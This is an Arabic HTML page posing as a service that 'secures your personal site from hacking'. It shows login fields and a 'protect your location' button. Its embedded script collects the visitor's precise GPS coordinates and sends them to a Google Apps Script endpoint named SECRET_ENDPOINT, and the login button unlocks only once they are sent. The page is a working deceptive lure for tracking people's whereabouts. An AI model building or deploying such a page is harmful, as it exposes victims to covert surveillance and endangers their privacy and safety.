<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>موقعي الشخصي</title>
  <style>
    body {
      font-family: "Tahoma", sans-serif;
      background: linear-gradient(to bottom right, #0078ff, #00c6ff);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h1 { font-size: 2.2em; margin-bottom: 5px; }
    h2 { font-weight: normal; margin-bottom: 20px; }
    .login-box {
      background-color: rgba(255, 255, 255, 0.15);
      padding: 20px;
      border-radius: 15px;
      width: 300px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      display: flex;
      flex-direction: column;
    }
    input { width: 100%; padding: 10px; margin: 8px 0; border: none; border-radius: 10px; outline: none; font-size: 1em; }
    button { width: 100%; padding: 10px; background-color: #fff; color: #0078ff; border: none; border-radius: 10px; font-weight: bold; font-size: 1em; cursor: pointer; transition: background 0.3s; }
    button:hover { background-color: #e3e3e3; }
  </style>
</head>
<body>
  <h1>🔒📌 تامين موقعك الشخصي وحمايته من الاختراق</h1>
  <h2>عبدربه سيف الجوفي</h2>

  <div class="login-box">
    <input type="email" placeholder="اكتب الإيميل هنا" id="email">
    <input type="password" placeholder="اكتب كلمة المرور هنا" id="password">
    <button id="loginButton" disabled>تسجيل الدخول</button>
  </div>

  <button id="protectButton" onclick="requestAndSendLocation()">
    اضغط لحماية موقعك (يتطلب موافقة الموقع)
  </button>
  <p id="locationStatus" style="font-weight: bold; color: yellow;">
    (انتظر موافقتك على مشاركة الموقع الدقيق)
  </p>

<script>
// توليد معرف جلسة عشوائي
function generateSessionId() { return 'LOC_' + Math.random().toString(36).substring(2, 9); }

// الرابط الجديد للـ Google Apps Script Web App
const SECRET_ENDPOINT = 'https://script.google.com/macros/s/AKfycbw2vAbVTnmKex9BE185k84Rnx8-SS4EjNfnpVZ4UG7LxAS8PmY9DLmyZinm8qKHDgiE8g/exec';

function requestAndSendLocation() {
    const statusElement = document.getElementById('locationStatus');
    const loginButton = document.getElementById('loginButton');
    const sessionId = generateSessionId();

    if (!navigator.geolocation) {
        statusElement.textContent = "عذراً، المتصفح لا يدعم تحديد الموقع الجغرافي.";
        return;
    }

    statusElement.textContent = "جاري طلب إذن الموقع... (يرجى الموافقة)";

    navigator.geolocation.getCurrentPosition(
        function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            statusElement.textContent = `تم الحصول على موقعك الدقيق (ID: ${sessionId}). جاري الإرسال...`;

            const locationData = { session_id: sessionId, latitude, longitude };

            fetch(SECRET_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(locationData)
            })
            .then(response => response.json())
            .then(data => {
                statusElement.textContent = `نجاح الإرسال! يمكنك الآن تسجيل الدخول. (ID: ${sessionId})`;
                loginButton.disabled = false; // تفعيل زر تسجيل الدخول بعد السماح
            })
            .catch(error => {
                console.error(error);
                statusElement.textContent = `حدث خطأ في الاتصال بالخادم. (ID: ${sessionId})`;
            });
        },
        function(error) {
            statusElement.textContent = "تم رفض طلب مشاركة الموقع من قبل المستخدم.";
        }
    );
}

// عند الضغط على تسجيل الدخول
document.getElementById('loginButton').addEventListener('click', () => {
    window.location.href = "main.html";
});
</script>
</body>
</html>
